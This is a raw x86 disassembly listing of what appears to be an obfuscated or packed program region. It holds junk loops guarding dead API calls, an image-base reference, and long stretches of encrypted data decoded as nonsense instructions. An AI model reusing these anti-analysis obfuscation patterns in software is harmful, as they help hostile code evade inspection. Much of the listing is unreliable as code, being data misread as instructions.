  40a01c:	sbb    ah,BYTE PTR [eax+esi*4+0x14414856]
  40a023:	es and al,0x12
  40a026:	out    0xa4,eax
  40a028:	enter  0xe87,0x91
  40a02c:	push   edi
  40a02d:	cli    
  40a02e:	iret   
  40a02f:	adc    DWORD PTR [ecx],ebx
  40a031:	cmp    ebp,ebx
  40a033:	mov    esp,0x891e2429
  40a038:	sbb    al,0xce
  40a03a:	(bad)  
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x6d60,0xd8
  40a1b4:	xchg   ecx,eax
  40a1b5:	dec    ebx
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	daa    
  40a1bf:	pop    ds
  40a1c0:	adc    BYTE PTR [edi+edi*4],cl
  40a1c3:	push   eax
  40a1c4:	imul   esp,DWORD PTR [edi+0x5bd3997b],0xffffff89
  40a1cb:	(bad)  
  40a1cd:	or     eax,0xb9a92b74
  40a1d2:	retf   
  40a1d3:	adc    al,0x8e
  40a1d5:	frstor [edi]
  40a1d7:	ins    DWORD PTR es:[edi],dx
  40a1d8:	or     edx,DWORD PTR [ecx-0x1]
  40a1db:	test   eax,0xc9d666b1
  40a1e0:	mov    DWORD PTR [edi],edi
  40a1e2:	jae    0x40a262
  40a1e4:	and    al,0x73
  40a1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1e7:	dec    edx
  40a1e8:	mov    ds:0x441bbd6a,al
  40a1ed:	sti    
  40a1ee:	mov    eax,ds:0x43f9ad4
  40a1f3:	push   es
  40a1f4:	or     ch,bl
  40a1f6:	outs   dx,DWORD PTR ds:[esi]
  40a1f7:	shl    DWORD PTR [edi-0x2a],1
  40a1fa:	lahf   
  40a1fb:	fadd   QWORD PTR [edx-0xc19253f]
  40a201:	cmp    BYTE PTR [edx+ebx*8+0x799afe9c],dh
  40a208:	add    BYTE PTR [edi+0x750b9a9d],dl
  40a20e:	lods   eax,DWORD PTR ds:[esi]
  40a20f:	fbstp  TBYTE PTR [esi]
  40a211:	jbe    0x40a1b9
  40a213:	push   ds
  40a214:	aam    0xff
  40a216:	jl     0x40a1ad
  40a218:	xchg   BYTE PTR [ebp-0x75],ch
  40a21b:	push   eax
  40a21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a21d:	mov    al,ds:0x22ac5acb
  40a222:	push   ss
  40a223:	sahf   
  40a224:	adc    al,BYTE PTR [ebp-0x3dc35820]
  40a22a:	adc    BYTE PTR [esi+esi*8+0x5cd988ef],al
  40a231:	dec    edi
  40a232:	(bad)  
  40a233:	jmp    0x1ee1:0x4c331bb5
  40a23a:	jns    0x40a233
  40a23c:	mov    dl,0xc5
  40a23e:	mov    edi,0x6db9db50
  40a243:	in     al,dx
  40a244:	dec    esi
  40a245:	test   DWORD PTR [ecx-0x693f4713],edi
  40a24b:	xchg   edx,eax
  40a24c:	adc    DWORD PTR [edx+eax*8+0x26cf2f58],eax
  40a253:	sub    DWORD PTR [ebp-0x35bebd72],ecx
  40a259:	pop    edx
  40a25a:	xchg   DWORD PTR [ecx-0x5771ed6a],ecx
  40a260:	sub    BYTE PTR [ebx-0xa139157],dh
  40a266:	js     0x40a25b
  40a268:	js     0x40a293
  40a26a:	addr16 cmp eax,0x69db369f
  40a270:	cwde   
  40a271:	mov    eax,0x67d7f13d
  40a276:	sub    bl,dl
  40a278:	rol    al,cl
  40a27a:	pusha  
  40a27b:	stc    
  40a27c:	fiadd  DWORD PTR [esi+0x14]
  40a27f:	fsub   DWORD PTR [edx]
  40a281:	mov    bl,0xe
  40a283:	mov    ds:0xaa870df4,al
  40a288:	jnp    0x40a253
  40a28a:	push   cs
  40a28b:	rcr    DWORD PTR [ebx-0x32],1
  40a28e:	imul   esi,ebx,0x13
  40a291:	retf   
  40a292:	(bad)  
  40a293:	dec    esi
  40a294:	and    BYTE PTR [ebp-0x20],cl
  40a297:	retf   0xb264
  40a29a:	js     0x40a2fb
  40a29c:	lahf   
  40a29d:	mov    cl,0xc0
  40a29f:	inc    edx
  40a2a0:	cmc    
  40a2a1:	jg     0x40a25e
  40a2a3:	xchg   BYTE PTR [edi+0x2cace7d4],al
  40a2a9:	das    
  40a2aa:	or     al,ch
  40a2ac:	imul   edx,esi,0x22
  40a2af:	mov    eax,0xfbea1237
  40a2b4:	dec    eax
  40a2b5:	add    dl,BYTE PTR [ebx+0x63]
  40a2b8:	daa    
  40a2b9:	cmp    al,0x40
  40a2bb:	push   edx
  40a2bc:	jne    0x40a2af
  40a2be:	gs jne 0x40a304
  40a2c1:	jmp    0x134a:0x8e33cf73
  40a2c8:	jne    0x40a27a
  40a2ca:	xor    bh,BYTE PTR [edi]
  40a2cc:	retf   0x8cce
  40a2cf:	cmp    DWORD PTR [ecx],esi
  40a2d1:	add    bl,BYTE PTR [edx-0x2193dfb0]
  40a2d7:	mov    eax,gs:0xed50b178
  40a2dd:	mov    ?,ecx
  40a2df:	imul   ebx,ecx,0xbed192a6
  40a2e5:	retf   0x6887
  40a2e8:	ds jns 0x40a276
  40a2eb:	cs aaa 
  40a2ed:	idiv   cl
  40a2ef:	adc    al,0x93
  40a2f1:	sub    DWORD PTR [eax+0x73ba197b],edx
  40a2f7:	paddd  mm1,QWORD PTR [eax+edx*1+0x4c8f012c]
  40a2ff:	test   eax,0xae2725be
  40a304:	stos   DWORD PTR es:[edi],eax
  40a305:	mov    eax,0xf9b140e
  40a30a:	sbb    eax,0x703fa508
  40a30f:	mov    DWORD PTR [ebx-0x2a86fcb5],ecx
  40a315:	daa    
  40a316:	jb     0x40a35f
  40a318:	xor    BYTE PTR ds:[ecx+edi*8-0x2df32b2b],bh
  40a320:	mov    edi,0xb5375cc9
  40a325:	(bad)  
  40a326:	adc    eax,0x9c3e45a3
  40a32b:	jne    0x40a35d
  40a32d:	stc    
  40a32e:	mov    WORD PTR [ebx+ebx*4-0x197ce3a2],ds
  40a335:	call   DWORD PTR [eax-0x6e]
  40a338:	mov    esp,0xa5cb108d
  40a33d:	adc    eax,0x5ec11a57
  40a342:	and    al,0xd6
  40a344:	cmp    eax,0x8f0e7f08
  40a349:	mov    dh,0x8f
  40a34b:	(bad)  
  40a34c:	out    0x53,eax
  40a34e:	fld    st(2)
  40a350:	sbb    ebx,DWORD PTR [eax+edx*4+0x4b]
  40a354:	sub    eax,0xb2f49313
  40a359:	cmc    
  40a35a:	int3   
  40a35b:	jle    0x40a327
  40a35d:	pop    ds
  40a35e:	aad    0x44
  40a360:	and    al,0xb9
  40a362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a363:	sbb    BYTE PTR [eax-0x59ff39b0],ch
  40a369:	mov    cl,BYTE PTR [ebx+0x2b]
  40a36c:	xor    al,0xee
  40a36e:	out    dx,al
  40a36f:	mov    ebp,0x2fd60b83
  40a374:	pop    ebx
  40a375:	push   0xffffffea
  40a377:	xlat   BYTE PTR ds:[ebx]
  40a378:	sub    BYTE PTR [eax+edx*1+0x7b],al
  40a37c:	adc    esp,ebx
  40a37e:	pusha  
  40a37f:	jo     0x40a31f
  40a381:	inc    eax
  40a382:	xchg   BYTE PTR ss:[eax+0x2e],cl
  40a386:	push   0x8c2014e2
  40a38b:	adc    ch,BYTE PTR [edx]
  40a38d:	out    dx,eax
  40a38e:	dec    edi
  40a38f:	sar    BYTE PTR [ebp+0x1cef1dad],cl
  40a395:	ss mov ch,0xdb
  40a398:	mov    al,0xa6
  40a39a:	pop    edi
  40a39b:	inc    edx
  40a39c:	mov    DWORD PTR [edx+edi*4],edx
  40a39f:	rol    bl,1
  40a3a1:	stos   BYTE PTR es:[edi],al
  40a3a2:	ins    DWORD PTR es:[di],dx
  40a3a4:	ss pop esi
  40a3a6:	cli    
  40a3a7:	add    dh,dl
  40a3a9:	lods   eax,DWORD PTR ds:[esi]
  40a3aa:	adc    cl,dh
  40a3ac:	icebp  
  40a3ad:	shl    DWORD PTR [ecx],1
  40a3af:	cmp    BYTE PTR [ebx],dl
  40a3b1:	(bad)  
  40a3b2:	stos   BYTE PTR es:[edi],al
  40a3b3:	xor    edx,ecx
  40a3b5:	call   0x2a54:0x34dbdf73
  40a3bc:	or     esi,DWORD PTR [ecx]
  40a3be:	jns    0x40a3b6
  40a3c0:	cmp    DWORD PTR [edi-0x12879139],0x19
  40a3c7:	adc    eax,0x8716bfb0
  40a3cc:	lahf   
  40a3cd:	adc    esp,ecx
  40a3cf:	cdq    
  40a3d0:	and    eax,0x26920d17
  40a3d5:	stc    
  40a3d6:	mov    dh,BYTE PTR [edi]
  40a3d8:	mov    ecx,ebx
  40a3da:	add    cl,bl
  40a3dc:	jl     0x40a411
  40a3de:	and    ebx,ebp
  40a3e0:	xchg   edi,eax
  40a3e1:	shl    BYTE PTR [edx+0x73],cl
  40a3e4:	add    esi,DWORD PTR [ebx+0x62]
  40a3e7:	cwde   
  40a3e8:	pop    esi
  40a3e9:	cmp    eax,0x3bc41448
  40a3ee:	in     eax,dx
  40a3ef:	push   ebp
  40a3f0:	lock lock mov ecx,ecx
  40a3f4:	popa   
  40a3f5:	xor    bl,BYTE PTR [edi]
  40a3f7:	mov    esp,0xc0dd9eac
  40a3fc:	mov    BYTE PTR [ecx],bh
  40a3fe:	or     DWORD PTR [esi],ebp
  40a400:	leave  
  40a401:	xor    bh,BYTE PTR [edx-0x76]
  40a404:	gs sti 
  40a406:	pop    es
  40a407:	push   esi
  40a408:	call   0x155d:0xfac29ef
  40a40f:	jmp    0x40a439
  40a411:	fstp   QWORD PTR [esi+0x6a]
  40a414:	jp     0x40a3ff
  40a416:	iret   
  40a417:	mov    edx,?
  40a419:	int    0x5c
  40a41b:	xchg   DWORD PTR [esi],edi
  40a41d:	mov    ebp,0xe1f62fbf
  40a422:	pop    ebx
  40a423:	cdq    
  40a424:	test   eax,0x4d078d27
  40a429:	aas    
  40a42a:	out    dx,eax
  40a42b:	sub    DWORD PTR gs:[edx-0x4fb35ac8],0xffffffc0
  40a433:	shl    BYTE PTR [ebx+ecx*8-0x54ad8170],0x83
  40a43b:	imul   ebx,ebx,0x72b3c338
  40a441:	and    esi,edx
  40a443:	xor    BYTE PTR [edi],0x66
  40a446:	outs   dx,DWORD PTR ds:[esi]
  40a447:	mov    cl,0xc3
  40a449:	call   0x1aa7fab2
  40a44e:	stc    
  40a44f:	sahf   
  40a450:	mov    al,0x79
  40a452:	dec    esp
  40a453:	and    ah,BYTE PTR [edx]
  40a455:	cli    
  40a456:	les    ebp,FWORD PTR [ebp+0x4e]
  40a459:	xor    DWORD PTR [ebp+0x4],eax
  40a45c:	mov    bh,0x2c
  40a45e:	test   al,0x5
  40a460:	(bad)  
  40a461:	push   ss
  40a462:	(bad)  
  40a463:	mov    ebp,0x1074b7cb
  40a468:	adc    bl,BYTE PTR [eax+0x21]
  40a46b:	pop    edi
  40a46c:	out    dx,eax
  40a46d:	jmp    0xdd936f73
  40a472:	ror    DWORD PTR [eax+edi*1+0x0],1
  40a476:	loop   0x40a46a
  40a478:	ret    
  40a479:	mov    ebx,DWORD PTR [edx+ebx*4]
  40a47c:	cmp    edx,edx
  40a47e:	push   es
  40a47f:	adc    eax,0xbc9772e3
  40a484:	mov    edi,esp
  40a486:	ins    DWORD PTR es:[edi],dx
  40a487:	and    al,0xfa
  40a489:	in     eax,dx
  40a48a:	mov    cl,0x15
  40a48c:	inc    ecx
  40a48d:	mov    ?,WORD PTR [ebx]
  40a48f:	div    DWORD PTR [ebx+0x7e22a9ed]
  40a495:	ins    DWORD PTR es:[edi],dx
  40a496:	sbb    edi,DWORD PTR [ebx+0x17]
  40a499:	mov    ebp,0xfb2a5814
  40a49e:	dec    ebp
  40a49f:	or     BYTE PTR [edi+0x3d],dl
  40a4a2:	popf   
  40a4a3:	xchg   ecx,eax
  40a4a4:	xor    al,0xa6
  40a4a6:	cwde   
  40a4a7:	gs and ch,ah
  40a4aa:	and    ebx,0x15e5c648
  40a4b0:	gs jle 0x40a505
  40a4b3:	mov    edx,0x8826a5fc
  40a4b8:	jns    0x40a506
  40a4ba:	lea    eax,[ebp-0x24]
  40a4bd:	and    DWORD PTR ds:0x42a7cd,0x42a7f5
  40a4c7:	mov    DWORD PTR [ebp-0x28],eax
  40a4ca:	sub    DWORD PTR ds:0x42a889,0x30d0
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2+0x64],dh
  40a61b:	bound  esi,QWORD PTR [esi+0x78fede3c]
  40a621:	js     0x40a697
  40a623:	jle    0x40a69d
  40a625:	js     0x40a5e4
  40a627:	inc    ebp
  40a628:	out    0x49,eax
  40a62a:	js     0x40a671
  40a62c:	inc    esi
  40a62d:	jmp    0xb870:0xd2e1c02
  40a634:	xor    BYTE PTR [edx+0x214dfaca],dl
  40a63a:	fs mov eax,0x5368fa70
  40a640:	cmp    eax,0x4d46e70c
  40a645:	or     DWORD PTR [ecx-0x7b1a836a],ebp
  40a64b:	scas   eax,DWORD PTR es:[edi]
  40a64c:	pop    ecx
  40a64d:	sbb    eax,0x4fff58fc
  40a652:	inc    eax
  40a653:	aam    0x50
  40a655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a656:	jno    0x40a609
  40a658:	pushf  
  40a659:	mov    esi,0xea3ad1b0
  40a65e:	push   esp
  40a65f:	cmp    al,0xb0
  40a661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a662:	jne    0x40a6e3
  40a664:	scas   al,BYTE PTR es:[edi]
  40a665:	jmp    0xb08cac3f
  40a66a:	ret    0xbdc6
  40a66d:	add    DWORD PTR [eax-0x10],edx
  40a670:	mov    bh,0x19
  40a672:	cmp    edi,DWORD PTR [edx+0x3c]
  40a675:	in     eax,0x3c
  40a677:	xlat   BYTE PTR ds:[ebx]
  40a678:	mov    ah,0x43
  40a67a:	icebp  
  40a67b:	inc    eax
  40a67c:	sbb    DWORD PTR [ebp+0x5d5a17d7],0xffffffc2
  40a683:	xchg   esi,eax
  40a684:	hlt    
  40a685:	jmp    0x40a6b3
  40a687:	adc    bl,BYTE PTR fs:[ecx-0x70]
  40a68b:	add    ebx,DWORD PTR [eax+0x1b]
  40a68e:	sub    al,0xde
  40a690:	loope  0x40a700
  40a692:	loope  0x40a6cd
  40a694:	cmc    
  40a695:	push   cs
  40a696:	jp     0x40a6cb
  40a698:	div    ebx
  40a69a:	cmp    DWORD PTR [ecx+0x14],edx
  40a69d:	idiv   BYTE PTR [ebx-0x7c]
  40a6a0:	(bad)  
  40a6a1:	sbb    ebx,DWORD PTR [esi+0x73]
  40a6a4:	mov    ch,0xa2
  40a6a6:	out    0x39,eax
  40a6a8:	push   0x78
  40a6aa:	mov    esi,edx
  40a6ac:	jecxz  0x40a713
  40a6ae:	xor    ah,ch
  40a6b0:	mov    ds:0x15cc8a15,al
  40a6b5:	xchg   ebx,eax
  40a6b6:	les    esi,FWORD PTR [ebp+0x4a3167d5]
  40a6bc:	jl     0x40a651
  40a6be:	dec    ecx
  40a6bf:	push   esp
  40a6c0:	jmp    0x6a626133
  40a6c5:	jle    0x40a728
  40a6c7:	pop    ds
  40a6c8:	aad    0x1b
  40a6ca:	xchg   BYTE PTR [eax+0x62ed6002],ah
  40a6d0:	jge    0x40a708
  40a6d2:	mov    ecx,0x91b6003a
  40a6d7:	adc    dh,BYTE PTR [edi-0x5ce00de8]
  40a6dd:	cmc    
  40a6de:	mov    al,al
  40a6e0:	fiadd  DWORD PTR [edx-0x26287d15]
  40a6e6:	or     edi,DWORD PTR [esi+eiz*4+0x64]
  40a6ea:	push   esp
  40a6eb:	push   esi
  40a6ec:	sbb    eax,0x72a31cf2
  40a6f1:	jl     0x40a6ba
  40a6f3:	fsub   st(2),st
  40a6f5:	pop    ss
  40a6f6:	shl    DWORD PTR [ecx+0x68b4136],0xd3
  40a6fd:	clc    
  40a6fe:	not    DWORD PTR [edi+0x4b]
  40a701:	pop    ebx
  40a702:	sahf   
  40a703:	ins    BYTE PTR es:[edi],dx
  40a704:	loop   0x40a6b3
  40a706:	data16 or dl,BYTE PTR [edi-0x244ae8af]
  40a70d:	mov    esp,0x691ebe6f
  40a712:	retf   0x38de
  40a715:	lea    ebx,[ecx+0x33]
  40a718:	fisub  DWORD PTR [edx]
  40a71a:	pop    ecx
  40a71b:	cmp    cl,BYTE PTR [ebx-0x54d86d2c]
  40a721:	xchg   esp,eax
  40a722:	cmp    al,0x48
  40a724:	and    BYTE PTR [ecx-0x4f3857f2],bl
  40a72a:	inc    esp
  40a72b:	and    BYTE PTR ss:[edi],0xf5
  40a72f:	inc    ebx
  40a730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a731:	test   BYTE PTR [edx+0x42749acd],bl
  40a737:	fwait
  40a738:	and    DWORD PTR [esi],eax
  40a73a:	jo     0x40a77d
  40a73c:	mov    esp,0x46f805ec
  40a741:	cmp    al,0xb7
  40a743:	retf   
  40a744:	mov    eax,0xe8c66d09
  40a749:	fdiv   st,st(0)
  40a74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a74c:	dec    ecx
  40a74d:	dec    edi
  40a74e:	int    0x4d
  40a750:	pop    eax
  40a751:	or     al,0x3c
  40a753:	enter  0x77ba,0xba
  40a757:	int3   
  40a758:	cmc    
  40a759:	pop    ebp
  40a75a:	arpl   WORD PTR [edi+0x76358524],ax
  40a760:	pop    ecx
  40a761:	pushw  es
  40a763:	and    DWORD PTR [eax-0x17cc8015],ebp
  40a769:	rol    DWORD PTR [eax-0x47ddd7b5],cl
  40a76f:	xor    ebx,eax
  40a771:	inc    ecx
  40a772:	out    dx,eax
  40a773:	fcmovnb st,st(4)
  40a775:	loopne 0x40a7a2
  40a777:	adc    bl,BYTE PTR [ebp-0x4d8d32a8]
  40a77d:	jle    0x40a71b
  40a77f:	ret    
  40a780:	or     dh,bl
  40a782:	(bad)  [edx]
  40a784:	mov    eax,0x29f9c3b7
  40a789:	leave  
  40a78a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a78b:	xor    esi,DWORD PTR [ecx+0x7b0e2620]
  40a791:	xchg   ebx,eax
  40a792:	sbb    cl,0xfa
  40a795:	mov    al,ds:0xf677e417
  40a79a:	aad    0xbc
  40a79c:	mov    ch,0x96
  40a79e:	inc    edi
  40a79f:	fld    DWORD PTR [edx+eiz*4-0x73]
  40a7a3:	ret    
  40a7a4:	xor    BYTE PTR [edx-0x9e7dc01],bl
  40a7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7ab:	mov    dh,BYTE PTR [edi-0x3a2c0ff6]
  40a7b1:	shl    BYTE PTR [eax+eax*2-0x72],cl
  40a7b5:	out    dx,eax
  40a7b6:	mov    ah,0x7b
  40a7b8:	lea    esi,[ebp+0x46b75cf3]
  40a7be:	jne    0x40a790
  40a7c0:	sub    DWORD PTR [ecx-0x53],edx
  40a7c3:	pop    esp
  40a7c4:	clc    
  40a7c5:	ret    
  40a7c6:	and    eax,0x1e05205a
  40a7cb:	clc    
  40a7cc:	out    0x73,al
  40a7ce:	clc    
  40a7cf:	in     al,0x8d
  40a7d1:	xor    bh,bl
  40a7d3:	jmp    0xc6822557
  40a7d8:	stos   BYTE PTR es:[edi],al
  40a7d9:	dec    esp
  40a7da:	xor    eax,ebp
  40a7dc:	add    DWORD PTR ds:0x4a304032,ebp
  40a7e2:	fwait
  40a7e3:	lods   al,BYTE PTR ds:[esi]
  40a7e4:	inc    eax
  40a7e5:	sub    al,BYTE PTR [edi-0x29]
  40a7e8:	xchg   esi,eax
  40a7e9:	pop    es
  40a7ea:	mov    ch,0xbb
  40a7ec:	fld    DWORD PTR [esi]
  40a7ee:	pop    ebp
  40a7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7f0:	dec    esi
  40a7f1:	or     BYTE PTR ds:0x1d184dd7,cl
  40a7f7:	mov    eax,ds:0x410eaf37
  40a7fc:	and    esi,ebp
  40a7fe:	pop    edx
  40a7ff:	(bad)  
  40a800:	jl     0x40a7c9
  40a802:	xchg   edi,eax
  40a803:	sub    BYTE PTR [ebp-0x68cf0ee1],ah
  40a809:	mov    al,0xf6
  40a80b:	pop    ebp
  40a80c:	sbb    edi,0x4a
  40a80f:	and    eax,0x30633a86
  40a814:	or     eax,0x844a51e9
  40a819:	int3   
  40a81a:	stos   BYTE PTR es:[edi],al
  40a81b:	inc    eax
  40a81c:	popa   
  40a81d:	rcl    ecx,0x71
  40a820:	jae    0x40a83f
  40a822:	imul   esp,DWORD PTR [ebx],0xc05ee0b
  40a828:	push   ss
  40a829:	pop    ecx
  40a82a:	jo     0x40a7bb
  40a82c:	sbb    ebp,DWORD PTR [esi-0x50a42d29]
  40a832:	push   ecx
  40a833:	jle    0x40a829
  40a835:	stos   BYTE PTR es:[edi],al
  40a836:	scas   al,BYTE PTR es:[edi]
  40a837:	dec    ebx
  40a838:	add    eax,0x3f866e46
  40a83d:	cmp    eax,0x951c1127
  40a842:	xchg   DWORD PTR [edx-0x8],ebx
  40a845:	retf   
  40a846:	pushf  
  40a847:	adc    al,cl
  40a849:	sbb    DWORD PTR [ecx-0x30],ecx
  40a84c:	scas   eax,DWORD PTR es:[edi]
  40a84d:	xchg   edi,eax
  40a84e:	das    
  40a84f:	add    DWORD PTR [ecx],esp
  40a851:	inc    ecx
  40a852:	sahf   
  40a853:	fistp  DWORD PTR [ebx+0x75]
  40a856:	out    dx,al
  40a857:	mov    ds,WORD PTR [edi+0x62]
  40a85a:	ss mov ch,0xb0
  40a85d:	sti    
  40a85e:	cwde   
  40a85f:	in     eax,dx
  40a860:	cmp    BYTE PTR [ebx],0xd9
  40a863:	scas   al,BYTE PTR es:[edi]
  40a864:	ret    
  40a865:	xor    DWORD PTR [ebp+0x20],eax
  40a868:	in     al,dx
  40a869:	xor    cl,BYTE PTR [ebx]
  40a86b:	xchg   esp,eax
  40a86c:	mov    bh,0xb1
  40a86e:	adc    BYTE PTR [eax],ah
  40a870:	mov    ch,0xd1
  40a872:	cld    
  40a873:	mov    edx,0x624a46fc
  40a878:	cmp    al,0x21
  40a87a:	loop   0x40a8ae
  40a87c:	xchg   al,dh
  40a87e:	push   ds
  40a87f:	retf   0xcd72
  40a882:	pusha  
  40a883:	ret    
  40a884:	xchg   edx,eax
  40a885:	and    ah,cl
  40a887:	fcom   DWORD PTR [edx]
  40a889:	mov    WORD PTR [ecx-0x3f080574],?
  40a88f:	xor    edi,edx
  40a891:	fisttp WORD PTR [ebp-0x36b3d15e]
  40a897:	rcl    DWORD PTR [esi-0x25174fad],cl
  40a89d:	xor    DWORD PTR [eax+0x63],esp
  40a8a0:	imul   DWORD PTR [ebp+0x42587d]
  40a8a6:	fwait
  40a8a7:	sub    BYTE PTR [esi+ecx*4],0xaa
  40a8ab:	test   al,0xcf
  40a8ad:	adc    BYTE PTR [ebp+0x54],0x30
  40a8b1:	gs stos DWORD PTR es:[edi],eax
  40a8b3:	jle    0x40a86d
  40a8b5:	outs   dx,DWORD PTR ds:[esi]
  40a8b6:	push   0x247b485
  40a8bb:	outs   dx,BYTE PTR ds:[esi]
  40a8bc:	push   edx
  40a8bd:	xchg   esp,eax
  40a8be:	ficomp WORD PTR [esi]
